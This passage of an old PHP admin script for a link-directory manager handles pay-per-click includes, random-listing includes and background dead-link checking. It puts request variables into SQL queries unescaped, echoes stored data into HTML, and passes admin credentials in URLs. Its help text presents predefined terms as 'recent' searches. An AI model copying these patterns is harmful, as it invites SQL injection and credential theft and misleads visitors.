      <tr>
        <td width="32%" valign="top"><font face="Tahoma" size="2"><a href="help/sftid.htm" target="_blank">Tracking
          ID</a>:</font></td>
        <td width="68%" valign="top"><font face="Tahoma" size="2"><input name="sftrackid" size="10" style="font-family: Tahoma; font-size: 10pt" value="<?echo $sftrackid?>"></font></td>
      </tr>
      <tr>
        <td width="100%" valign="top" colspan="2">
          <p align="center"><font size="1" face="Tahoma">
                <input type="submit" value="Save Settings" name="B1" style="font-family: Trebuchet MS; font-size: 8pt"></font>
        </td>
      </tr>
    </table>
</form>
                </td>
              </tr>
            </table>
<form action="admin.php" method="post" style="margin: 0px">
<input type="hidden" name="action" value="newppcinc">            
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td height="20">
                </td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><font size="2" face="Tahoma"><u>Create New
                  PPC Include</u></font></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
    <table border="0" cellpadding="8" cellspacing="4" width="100%">
      <tr>
        <td width="32%" valign="top">
          <p align="left"><font face="Tahoma" size="2"><a href="help/sfd.htm" target="_blank">Description</a>:</font></td>
        <td width="68%" valign="top"><textarea rows="2" name="desc" cols="50" style="font-family: Tahoma; font-size: 10pt"></textarea></td>
      </tr>
      <tr>
        <td width="32%" valign="top"><font face="Tahoma" size="2"><a href="help/sfrpi.htm" target="_blank">Results
          Per Include</a>:</font></td>
        <td width="68%" valign="top"><font face="Tahoma" size="2"><input name="results" size="2" value="4" style="font-family: Tahoma; font-size: 10pt"></font></td>
      </tr>
      <tr>
        <td width="32%" valign="top"><font face="Tahoma" size="2"><a href="help/sfkti.htm" target="_blank">Keyword
          Term Input</a>:</font></td>
        <td width="68%" valign="top"><textarea rows="10" name="keywords" cols="50" style="font-family: Tahoma; font-size: 10pt"></textarea></td>
      </tr>
      <tr>
        <td width="32%" valign="top"></td>
        <td width="68%" valign="top"></td>
      </tr>
      <tr>
        <td width="100%" valign="top" colspan="2">
          <p align="center"><font size="1" face="Tahoma">
                <input type="submit" value="Create New Include" name="B1" style="font-family: Trebuchet MS; font-size: 8pt"></font>
        </td>
      </tr>
    </table>
                </td>
              </tr>
            </table>
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><u><font size="2" face="Tahoma">Existing
                  PPC Includes</font></u></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
      <table border="0" cellpadding="8" cellspacing="4" width="100%">
<?

	$res = mysql_query("select * from lma_ppc_includes");
	while ($inc = mysql_fetch_object($res)) {

?>

        <tr>
          <td width="30%" valign="top">
            <p align="left"><font size="2" face="Tahoma">&lt;%ppc-include-<?echo $inc->id?>%&gt;</font></td>
          <center>
          <td width="70%" valign="top"><font size="2" face="Tahoma"><?echo $inc->desc?></font></td>
          </tr>
          <tr>
            <td width="100%" valign="top" colspan="2">
              <p align="right"><a href="admin.php?action=editppcinc&inc=<?echo $inc->id?>"><font size="2" face="Tahoma">Edit</font></a><font size="2" face="Tahoma">
              | <a href="admin.php?action=delppcinc&inc=<?echo $inc->id?>">Delete</a></font></td>
          </center>
        </tr>
<?
	}
?>          
      </table>
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
    </div>
    </td>
  </tr>
  </table>
</div>
</form>
  <?echo $footr?>

<?

}

elseif ($action == "saveppcsettings") {

	savesettings();
	message("Congratulations!","Your Pay-per-click settings were successfully saved.");

}

elseif ($action == "newppcinc") {

	$pol = mysql_query("insert into lma_ppc_includes values(NULL, '".addslashes($desc)."', '".addslashes($results)."', '".addslashes($keywords)."')") or die(mysql_error());

	message ("Congratulations!", "You have successfully created a new PPC include.");

}

elseif ($action == "editppcinc") {

	$pol = mysql_fetch_object(mysql_query("select * from lma_ppc_includes where id = '$inc'")) or die(mysql_error());

?>

<?echo $headr?>

<form action="admin.php" method="post" style="margin: 0px">
<input type="hidden" name="action" value="saveppcinc">
<input type="hidden" name="inc" value="<?echo $inc?>">

<div align="center">
  <table border="1" cellpadding="8" cellspacing="4" width="650" bordercolor="#C0C0C0" bgcolor="#F8F8F8">
    <tr>
      <td>
<div align="center">
  <table border="0" cellspacing="1" width="100%">
  <tr>
    <td height="30">
    <p align="right"><font face="Tahoma" size="2"><a href="admin.php">Main
    Admin</a></font>
    </td>
  </tr>
    <center>
  <tr>
    <td height="30">
    <p align="center"><b><font face="Trebuchet MS" size="4">Edit Include</font></b>
    </td>
  </tr>
  <tr>
    <td height="10">
    </td>
  </tr>
  <tr>
    <td height="20"><font size="2" face="Tahoma">To edit this include, simply
      make the respective changes in the fields below and click the save button.
      The site content created via this particular include will be updated in
      real time...</font></td>
  </tr>
  <tr>
    <td height="20">
    </td>
  </tr>
    </center>
  <tr>
    <td>
    <hr size="1" color="#C0C0C0">
    </td>
  </tr>
  <tr>
    <td>
    <p align="left"><b><u><font size="2" face="Tahoma">Edit Include</font></u></b>
    </td>
  </tr>
    <center>
  <tr>
    <td>
    <hr size="1" color="#C0C0C0">
    </td>
  </tr>
  <tr>
    <td height="20">
    </td>
  </tr>
  <tr>
    <td>
    <table border="0" cellpadding="8" cellspacing="4" width="100%">
      <tr>
        <td width="32%" valign="top">
          <p align="left"><font face="Tahoma" size="2"><a href="help/sfd.htm" target="_blank">Description</a>:</font></td>
        <td width="68%" valign="top"><textarea rows="2" name="desc" cols="50" style="font-family: Tahoma; font-size: 10pt"><?echo $pol->desc?></textarea></td>
      </tr>
      <tr>
        <td width="32%" valign="top"><font face="Tahoma" size="2"><a href="help/sfrpi.htm" target="_blank">Results
          Per Include</a>:</font></td>
        <td width="68%" valign="top"><font face="Tahoma" size="2"><input name="results" size="2" value="<?echo $pol->results?>" style="font-family: Tahoma; font-size: 10pt"></font></td>
      </tr>
      <tr>
        <td width="32%" valign="top"><font face="Tahoma" size="2"><a href="help/sfkti.htm" target="_blank">Keyword
          Term Input</a>:</font></td>
        <td width="68%" valign="top"><textarea rows="10" name="keywords" cols="50" style="font-family: Tahoma; font-size: 10pt"><?echo $pol->keywords?></textarea></td>
      </tr>
      <tr>
        <td width="100%" valign="top" colspan="2">

          <p align="center"><input type="submit" value="Save Changes" name="B3" style="font-family: Tahoma; font-size: 10pt; border-style: solid; border-width: 1"></td>
      </tr>
    </table>
    </td>
  </tr>
    </center>
  </table>
</div>
      </td>
    </tr>
  </table>
</div>
<?echo $footr?>

<?

}

elseif ($action == "saveppcinc") {

	$pol = mysql_query("update `lma_ppc_includes` SET `results` = '".$results."', `desc` = '".addslashes($desc)."', `keywords` = '".addslashes($keywords)."' where `id` = '$inc'") or die(mysql_error());

	message("Congratulations!", "The PPC include was successfully edited.");

}

elseif ($action == "delppcinc") {

	$pol = mysql_query("delete from lma_ppc_includes where id = '$inc'") or die(mysql_error());

	message ("Congratulations!", "You have successfully deleted the PPC include.");

}
elseif ($action == "additionalinc") {

$arsto = mysql_query("select content from lma_custom where id = 'addrandsearchterms'"); if (mysql_num_rows($arsto) > 0) $addrandsearchterms = array_shift(mysql_fetch_row($arsto));
?>

<?echo $headr?>

<form action="admin.php" method="post" style="margin: 0px">
<input type="hidden" name="action" value="saveadditionalinc">

<div align="center">
  <center>
  <table border="1" cellspacing="4" width="650" bgcolor="#F8F8F8" cellpadding="0" bordercolor="#C0C0C0">
  </center>
  <center>
  <tr>
    <td height="20">
    <div align="center">
      <table border="0" cellpadding="6" cellspacing="6" width="100%">
        <tr>
          <td width="100%">
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td>
            <p align="right"><a href="admin.php"><font size="2" face="Tahoma">Main
            Admin</font></a></p>
                </td>
              </tr>
              <tr>
                <td>
            <p align="center"><b><font face="Trebuchet MS" size="4">Additional
            &quot;Enhancement&quot; Includes</font></b></p>
                </center>
            <p align="left"><font size="2" face="Tahoma">The section of the Link Management Assistant
            contains various additional includes which you can manipulate and
            include in your templates to dramatically enhance your website
            directory.</font></p>
                </td>
              </tr>
  <center>
              <tr>
                <td height="20"></td>
              </tr>
  </center>
            </table>
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><font size="2" face="Tahoma"><u><b>Random
                  Listings</b></u>&nbsp;&nbsp;&nbsp; &lt;%random-listings%&gt;</font></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="10"></td>
              </tr>
              <tr>
                <td><font size="2" face="Tahoma">This include can be used to
                  populate random listings from your database into your website
                  directory pages. Where used in the templates, a new random
                  listing/s will be pulled from the database and will be
                  displayed each time it's accessed by a website visitor or
                  search engine robot. This will give the appearance that each
                  page on your directory is updated regularly and encourage the
                  search engine spiders to visit more often. It's also a great
                  way to give each page in your directory even more distinctly
                  unique content. You might like to call this area
                  &quot;featured listings&quot; or &quot;sites of the
                  moment&quot; etc.</font></td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>           
    <table border="0" cellpadding="8" cellspacing="4" width="100%">
      <tr>
        <td width="35%" valign="top">
          <p align="left"><font face="Tahoma" size="2"><a href="help/rlhm.htm" target="_blank">How
          Many Listings</a>?</font></td>
        <td width="65%" valign="top"><font face="Tahoma" size="2"><input name="addrandlistcount" size="2" value="<?echo $addrandlistcount?>" style="font-family: Tahoma; font-size: 10pt"></font></td>
      </tr>
      <tr>
        <td width="35%" valign="top"><font face="Tahoma" size="2"><a href="help/rlpo.htm" target="_blank">Only
          Include Premium Listings</a>?</font></td>
        <td width="65%" valign="top"><input type="checkbox" name="addrandlistprem" value="yes" <?if ($addrandlistprem == "yes") echo "checked"?>></td>
      </tr>
      <tr>
        <td width="100%" valign="top" colspan="2">
          <p align="center"><font size="1" face="Tahoma">
                <input type="submit" value="Save Settings" name="B1" style="font-family: Trebuchet MS; font-size: 8pt"></font>
        </td>
      </tr>
    </table>
                </td>
              </tr>
            </table>                    
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td height="20">
                </td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><font size="2" face="Tahoma"><u><b>Random
                  Categories</b></u>&nbsp;&nbsp;&nbsp;
                  &lt;%random-categories%&gt;</font></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="10"></td>
              </tr>
              <tr>
                <td><font size="2" face="Tahoma">This include can be used to
                  populate random category links / locations into your
                  directory pages. This is useful to increase cross linking
                  between categories encouraging visitors to visit more areas of
                  your directory, and the search engine robots to crawl deeper
                  into your directory structure. You could call these
                  &quot;related categories&quot; or &quot;popular
                  categories&quot; etc. You also have the option to display this
                  include vertically (categories displayed one after the other vertically)
                  or horizontally across the page giving you flexibility to incorporate
                  it into your templates in the most appropriate manner.</font></td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>                       
    <table border="0" cellpadding="8" cellspacing="4" width="100%">
      <tr>
        <td width="32%" valign="top">
          <p align="left"><font face="Tahoma" size="2"><a href="help/rchm.htm" target="_blank">How
          Many Categories</a>?</font></td>
        <td width="68%" valign="top"><font face="Tahoma" size="2"><input name="addrandcatcount" size="2" value="<?echo $addrandcatcount?>" style="font-family: Tahoma; font-size: 10pt"></font></td>
      </tr>
      <tr>
        <td width="32%" valign="top"><font face="Tahoma" size="2"><a href="help/rcdm.htm" target="_blank">Display
          Method</a>:</font></td>
        <td width="68%" valign="top"><font size="2" face="Tahoma"><select size="1" name="addrandcatdisplay" style="font-family: Verdana; font-size: 8pt">
            <option value="1" <?if ($addrandcatdisplay == "1") echo "selected"?>>Vertical</option>
            <option value="2" <?if ($addrandcatdisplay == "2") echo "selected"?>>Horizontal</option>
          </select></font></td>
      </tr>
      <tr>
        <td width="100%" valign="top" colspan="2">
          <p align="center"><font size="1" face="Tahoma">
                <input type="submit" value="Save Settings" name="B1" style="font-family: Trebuchet MS; font-size: 8pt"></font>
        </td>
      </tr>
    </table>
                </td>
              </tr>
            </table>
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><font size="2" face="Tahoma"><u><b>Random
                  &quot;Recent&quot; Search Terms</b></u>&nbsp;&nbsp;&nbsp; &lt;%random-search-terms%&gt;</font></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="10"></td>
              </tr>
              <tr>
                <td height="20"><font size="2" face="Tahoma">This include can be used to
                  populate links to a predefined set of search terms. Those
                  search terms will then link directly to the respective page of
                  search results, the same as would be seen by a user if they
                  actually conducted a physical search using the search feature.
                  It will also vary their display randomly on a page by page
                  basis. That is you might like to create an area called
                  &quot;recent search terms&quot; or &quot;popular search
                  terms&quot; in your directory templates. Although not
                  available yet, in the near future this feature will be
                  expanded to allow you to display the actual search terms
                  directory users are searching on.</font></td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
    <table border="0" cellpadding="8" cellspacing="4" width="100%">
      <tr>
        <td width="32%" valign="top">
          <p align="left"><font face="Tahoma" size="2"><a href="help/rstkip.htm" target="_blank">Keyword
          Term Input</a>:</font></td>
        <td width="68%" valign="top"><textarea rows="10" name="addrandsearchterms" cols="50" style="font-family: Tahoma; font-size: 10pt"><?echo $addrandsearchterms?></textarea></td>
      </tr>
      <tr>
        <td width="32%" valign="top"><font face="Tahoma" size="2"><a href="help/rsthmt.htm" target="_blank">Display
          How Many Terms</a>?</font></td>
        <td width="68%" valign="top"><font face="Tahoma" size="2"><input name="addrandsearchcount" size="2" value="<?echo $addrandsearchcount?>" style="font-family: Tahoma; font-size: 10pt"></font></td>
      </tr>
      <tr>
        <td width="32%" valign="top"><font face="Tahoma" size="2"><a href="help/rstdm.htm" target="_blank">Display
          Method</a>:</font></td>
        <td width="68%" valign="top"><font size="2" face="Tahoma"><select size="1" name="addrandsearchdisplay" style="font-family: Verdana; font-size: 8pt">
            <option value="1" <?if ($addrandsearchdisplay == "1") echo "selected"?>>Vertical</option>
            <option value="2" <?if ($addrandsearchdisplay == "2") echo "selected"?>>Horizontal</option>
          </select></font></td>
      </tr>
      <tr>
        <td width="100%" valign="top" colspan="2">
          <p align="center"><font size="1" face="Tahoma">
                <input type="submit" value="Save Settings" name="B1" style="font-family: Trebuchet MS; font-size: 8pt"></font>
        </td>
      </tr>
    </table>
</form>        
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
    </div>
    </td>
  </tr>
  </table>
</div>
</form>
  <?echo $footr?>

<?

}

elseif ($action == "saveadditionalinc") {

	if (!$HTTP_POST_VARS["addrandlistprem"]) $HTTP_POST_VARS["addrandlistprem"] = "";
	
	savesettings();
	
	$arsto = mysql_query("select content from lma_custom where id = 'addrandsearchterms'"); 
	if (mysql_num_rows($arsto) > 0) 
	   // update
	   $pol = mysql_query("update lma_custom set content = '$addrandsearchterms' where id = 'addrandsearchterms'");
	else
	   // insert
	   $pol = mysql_query("insert into lma_custom values ('addrandsearchterms', '$addrandsearchterms')");
	
	message("Congratulations!","Your additional includes settings were successfully saved.");

}

elseif ($action == "urlvalidation") {

?>

<?echo $headr?>

<div align="center">
  <center>
  <table border="1" cellspacing="4" width="650" bgcolor="#F8F8F8" cellpadding="0" bordercolor="#C0C0C0">
  </center>
  <center>
  <tr>
    <td height="20">
    <div align="center">
      <table border="0" cellpadding="6" cellspacing="6" width="100%">
        <tr>
          <td width="100%">
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td>
            <p align="right"><a href="admin.php"><font size="2" face="Tahoma">Main
            Admin</font></a></p>
                </td>
              </tr>
              <tr>
                <td>
            <p align="center"><b><font face="Trebuchet MS" size="4">URL
            Validation</font></b></p>
            <p align="left"><font size="2" face="Tahoma">This section
                  allows you to automatically clean your directory listings
            &amp; remove any dead
                    links. These are the listings where the domain name no
            longer exists or returns other &quot;cannot be found&quot; errors.
            It's a nice way to ensure listings within your directory actually
            point to active websites without having to physically check each
            one. This feature was primarily incorporated to help you clean DMOZ
            imports. The normal automated reciprocal link checking features will
            basically do the same job if you're using the Link Management
            Assistant exclusively for managing reciprocal link partners.</font></p>
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><font size="2" face="Tahoma"><u>URL
                  Validation</u></font></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>                
<? 
  $arsto = mysql_query("select content from lma_custom where id = 'urlvalidationid'"); 
  if (mysql_num_rows($arsto) > 0) { 
    list($ctype, $urlvalidationid) = split("-", array_shift(mysql_fetch_row($arsto)));
    if($ctype == "G") {
      $actionURL = "?action=urlvalidationrestart&ctype=G&user=$user&pass=$pass&startid=$urlvalidationid";
      $actionText = "checking";
    }
    else {
      $actionURL = "?action=urlvalidationrestart&ctype=R&user=$user&pass=$pass";
      $actionText = "rechecking";
    }
?>                
              <tr>
                <td>
                <table> <tr>
                <td colspan="2" bgcolor="#C0C0C0"> The URL Validation routine is currently <?echo $actionText ?> URL Id <b><?echo $urlvalidationid?></b>. 
                If this number does not change after 10 minutes then it is possible that the URL Validation routine has stalled, in which case you have the following two options
                </td>
                <tr>
                <tr> 
                <td bgcolor="#C0C0C0"><p align="center"><a href="admin.php<? echo $actionURL ?>">Check Here</a><br>To restart the routine from URL Id <?echo $urlvalidationid?></p></td>
                <td bgcolor="#C0C0C0"><p align="center"><a href="admin.php?action=urlvalidationcancel&user=<? echo $user ?>&pass=<? echo $pass ?>">Check Here</a><br>To cancel the URL Validation process</p></td>
                </tr>
                </table>
                
                </td>
              </tr>                
<?
  }
?>
              <tr>
                <td>
<form action="admin.php" method="post" style="margin: 0px">
<input type="hidden" name="action" value="dourlvalidation">                
                  <div align="center">
                    <center>
                    <table border="0" cellpadding="4" cellspacing="4" width="85%">
                      <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/uva.htm" target="_blank">How
                          Many Attempts</a>?</font></td>
                        <td width="63%" valign="top"><font face="Tahoma" size="2"><input type="text" name="urllcheckatt" size="4" style="font-family: Verdana; font-size: 8pt" value="<?echo $urllcheckatt?>">
                          (times)</font></td>
                      </tr>
                      <tr>
                        <td width="37%" valign="top"><a href="help/uvda.htm" target="_blank"><font face="Tahoma" size="2">Desired
                          Action</font></a><font face="Tahoma" size="2">?</font></td>
                        <td width="63%" valign="top"><font face="Tahoma" size="2">Generate
                          Report <input type="radio" value="1" name="urllcheckact" <?if ($urllcheckact == "1") echo "checked"?>>
                          </font> <font face="Tahoma" size="2">OR Delete
                          Automatically <input type="radio" value="2" name="urllcheckact" <?if ($urllcheckact == "2") echo "checked"?>> </font></td>
                      </tr>
                    </table>
                    </center>
                  </div>
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
  </center>
            <tr>
              <td><center>
                <p align="center"><font size="1" face="Tahoma"><input type="submit" value="Validate URLS Now" name="B1" style="font-family: Trebuchet MS; font-size: 8pt"></font></p>
                </form>
                <p align="center"><font size="1" face="Tahoma">NOTE: The above
                process can take quite some time depending on the number of
                listings you have in your directory, the checking </font><font size="1" face="Tahoma">schedule
                &amp; number of attempts you chose to make. As such, please be patient. A
                notification email will be sent to your administrators email
                address when the process has been completed. It is also HIGHLY
                RECOMMEND that you do not use the importing features whilst the
                URL validation process is underway, otherwise it will create a
                very heavy load your server.</font></p>
                </center>
                </td>
              </tr>
            </table>
<?
   if (file_exists("deadurllist.txt")) {
      
      $invalidurls = file("deadurllist.txt");
?>                  
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><u><font size="2" face="Tahoma">Dead Link Listing Report</font></u></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="10"></td>
              </tr>              
              <tr>
                <td><p align="center"><font size="2" face="Tahoma">The Link Management Assistant has determined
                  that there are <font color="#FF0000"><? echo count($invalidurls) ?></font>
                  dead links in the directory.</font></p>
                  <p><font size="2" face="Tahoma">To permanently delete them all
                  now you simply need to click the &quot;Remove Dead
                  Listings&quot; submit button at the bottom of the page.
                  Alternatively you can work your way down the list and view
                  each record to double check. If found to be active for
                  whatever reason, you can check the ignore button to retain the
                  listing. If you find the site is down for some other reason
                  (it has changed domain name and is not using a 30X redirect)
                  clicking the edit listing link will take you directly to the listings
                  complete record (in a new window) enabling you to edit it as
                  necessary. If you do edit a listing be sure
                  to also check the respective ignore box, otherwise it WILL be
                  deleted when you submit the &quot;Remove Dead Listings&quot;
                  button.</font></p>
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td height="20">
                  <div align="center">
                    <center>
                    <table border="0" cellpadding="4" cellspacing="4" width="85%">
                      <tr>
                        <td width="87%"></td>
                        <td width="5%" align="center"></td>
                        <td width="8%" align="center"><font face="Tahoma" size="1">Ignore</font></td>
<form action="admin.php" method="post" style="margin: 0px">
<input type="hidden" name="action" value="removedeadurls">                            
                      </tr>
<?
	while (list(,$ct) = each($invalidurls)) {

	   list($urlid,$url) = split("\|", $ct);
?>                      
                      <tr>
                        <td width="87%"><font face="Tahoma" size="2"><a href="<? echo $url ?>" target="_blank"><? echo $url ?></a></font></td>
                        <td width="5%" align="center"><font face="Tahoma" size="2"><a href="admin.php?action=editlinks&urlinvalidid=<?echo $urlid?>" target="_blank">Edit</a></font></td>
                        <td width="8%" align="center"><input type="hidden" name="urls[<?echo $urlid?>][name]" ><input type="checkbox" name="urls[<?echo $urlid?>][ignore]" value="yes"></td>
                      </tr>
<?
   }
?>                      
                      <tr>
                        <td width="100%" colspan="3"></td>
                      </tr>                   
                      <tr>
                        <td width="100%" colspan="3">
                          <p align="center"><font size="1" face="Tahoma"><input type="submit" value="Remove Dead Listings" name="B1" style="font-family: Trebuchet MS; font-size: 8pt"></font>
                          </p>
                          <p align="center"><font size="1" face="Tahoma">NOTE: The above
                          action is permanent and cannot be reversed. </font></td>
                      </tr>
</form>                      
                    </table>
                    </center>
                  </div>
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
            </table>
<?
   }
?>            
          </td>
        </tr>
      </table>
    </div>
    </td>
  </tr>
  </table>
</div>

<?echo $footr?>

<?

}

elseif ($action == "removedeadurls") {

	while (list($id,$inf) = each($urls)) {
	   if($inf['ignore'] != "yes")
	   	$puls = mysql_query("delete from lma_links where id = '$id'");    
	}   
   
  if(file_exists("urlvalidation.txt")) unlink("urlvalidation.txt");
  if(file_exists("deadurllist.txt")) unlink("deadurllist.txt");
  message("URL Validation", "The Link Management Assistant has removed the selected dead listings..");
}
   
elseif ($action == "dourlvalidation") {
   
  savesettings();  
   
  $arsto = mysql_query("select content from lma_custom where id = 'urlvalidationid'"); 
	if (mysql_num_rows($arsto) > 0) 
	  // update
	  $pol = mysql_query("update lma_custom set content = 'G-0' where id = 'urlvalidationid'");
	else
	  // insert
	  $pol = mysql_query("insert into lma_custom values ('urlvalidationid', 'G-0')");
   
   $fp = fsockopen($_SERVER['SERVER_NAME'], 80);
   fputs($fp, "GET ".$_SERVER['SCRIPT_NAME']."?action=urlvalidationgo&user=$user&pass=$pass HTTP/1.1\r\nAccept: */*\r\nAccept-Language: es-mx\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)\r\nHost: ".$_SERVER['SERVER_NAME']."\r\nConnection: Close\r\n\r\n");
   fclose($fp);
   
   message("URL Validation in progress...", "The Link Management Assistant has just started validating the links. This operation will take a while and you'll receive an e-mail notification when it's finished..");
}

elseif ($action == "urlvalidationgo") {
   
   ignore_user_abort(1);
   
   if(file_exists("deadurllist.txt")) unlink("deadurllist.txt");
   	
   if ($startid == "") $startid = "0";
   
   $pol = mysql_query("select * from lma_links where id > $startid order by id");
   if (mysql_num_rows($pol) > 0) {	

      if ($startid == 0)
		   $fp = fopen("urlvalidation.txt", "w");
		else
		   $fp = fopen("urlvalidation.txt", "a");
		   
		$ui =0;
		
		while ($urlLink = mysql_fetch_object($pol)) {
         if($ui++ > 10)
            break;
         
         $startid = $urlLink->id;
         $urlfp = fopen($urlLink->url, "r");
         if (!$urlfp)
            fputs($fp, $urlLink->id."|".$urlLink->url."|1\n");
         else
            fclose($urlfp);            
      }
      @fclose($fp);
      
      if ($ui > 10) {
         $pol = mysql_query("update lma_custom set content = 'G-$startid' where id = 'urlvalidationid'");
         $fp = fsockopen($_SERVER['SERVER_NAME'], 80);
         fputs($fp, "GET ".$_SERVER['SCRIPT_NAME']."?action=urlvalidationgo&user=$user&pass=$pass&startid=$startid HTTP/1.1\r\nAccept: */*\r\nAccept-Language: es-mx\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)\r\nHost: ".$_SERVER['SERVER_NAME']."\r\nConnection: Close\r\n\r\n");   
         fclose($fp);
 
      }
      else { // Start the recheck process
         $pol = mysql_query("update lma_custom set content = 'R-0' where id = 'urlvalidationid'");
         $fp = fsockopen($_SERVER['SERVER_NAME'], 80);
         fputs($fp, "GET ".$_SERVER['SCRIPT_NAME']."?action=urlvalidationrecheck&user=$user&pass=$pass HTTP/1.1\r\nAccept: */*\r\nAccept-Language: es-mx\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)\r\nHost: ".$_SERVER['SERVER_NAME']."\r\nConnection: Close\r\n\r\n");   
         fclose($fp);
     }   		
   }      
   else { // Start the recheck process
    $pol = mysql_query("update lma_custom set content = 'R-0' where id = 'urlvalidationid'");
    $fp = fsockopen($_SERVER['SERVER_NAME'], 80);
    fputs($fp, "GET ".$_SERVER['SCRIPT_NAME']."?action=urlvalidationrecheck&user=$user&pass=$pass HTTP/1.1\r\nAccept: */*\r\nAccept-Language: es-mx\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)\r\nHost: ".$_SERVER['SERVER_NAME']."\r\nConnection: Close\r\n\r\n");   
    fclose($fp);
  }   		
   
  message("URL Validation in progress...", "LMA is now restarting the unfinished URL Validation. You will receive an e-mail when this process is complete");
}

elseif ($action == "urlvalidationrecheck") {  
   
  ignore_user_abort(1);

  $invalidurls = @file("urlvalidation.txt");
  $ui = 0;
  $fi = 0;
  $di = 0;

  if($invalidurls) {
    while (list(,$ct) = each($invalidurls)) {
        
      if($ui <= 10) {
    	  list($urlid,$url,$attempt) = split("\|", $ct);
        $pol = mysql_query("update lma_custom set content = 'R-$urlid' where id = 'urlvalidationid'");
        if($attempt >= $urllcheckatt) {
          if($urllcheckact == 1) {
            $deadurls[$di++] = $urlid."|".$url;
          }
          else {
    	    	$puls = mysql_query("delete from lma_links where id = '$urlid'");   
          }
    	  }
        else {
          $ui++;
          $urlfp = fopen($url, "r");
          if (!$urlfp) {
            $failedurls[$fi++] = $urlid."|".$url."|".($attempt+1);
          }
          else
            fclose($urlfp);      
    	  }
      }
      else {
  			$newmc .= $ct;
  		}	  
    }
  }  
	if ($newmc || count($failedurls) > 0) {
		$fp = fopen("urlvalidation.txt", "w");
		if($newmc) {
		  fputs($fp, $newmc);
		}

		for($i = 0; $i < count($failedurls); $i++) {
		  fputs($fp, $failedurls[$i]."\n");
    }		  
		fclose($fp);
		if(count($deadurls) > 0) {
		  $fp = fopen("deadurllist.txt", "a");
  		for($i = 0; $i < count($deadurls); $i++) {	  
		    fputs($fp, $deadurls[$i]."\n");
      }		  
		  fclose($fp);
		}
		$fp = fsockopen($_SERVER['SERVER_NAME'], 80);
		fputs($fp, "GET ".$_SERVER['SCRIPT_NAME']."?user=$user&pass=$pass&action=urlvalidationrecheck HTTP/1.1\r\nAccept: */*\r\nAccept-Language: es-mx\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)\r\nHost: ".$_SERVER['SERVER_NAME']."\r\nConnection: Close\r\n\r\n");
		fclose($fp);
	}

	else {  
	 if(file_exists("urlvalidation.txt")) unlink("urlvalidation.txt");
    if(count($deadurls) > 0) {
		  $fp = fopen("deadurllist.txt", "a");
  		for($i = 0; $i < count($deadurls); $i++) {	  
		    fputs($fp, $deadurls[$i]."\n");
      }		  
		  fclose($fp);
		}
   
    $emtpl = mysql_fetch_object(mysql_query("select subject, body from lma_emails where id = 'urlvalidation'"));
    
    $subject = $emtpl->subject;
    $body = $emtpl->body;
    
    $adminurl = "http://".$_SERVER["SERVER_NAME"].$_SERVER["SCRIPT_NAME"];
    $body = str_replace("{ADMIN-LINK}", $adminurl, $body);
    
    mail($adminemail, $subject, $body, "From: $fromname <$adminemail>");
    
    $pol = mysql_query("delete from lma_custom where id = 'urlvalidationid'");
 }
}

elseif ($action == "urlvalidationrestart") {
   
   if($ctype == "G") {
      $fp = fsockopen($_SERVER['SERVER_NAME'], 80);
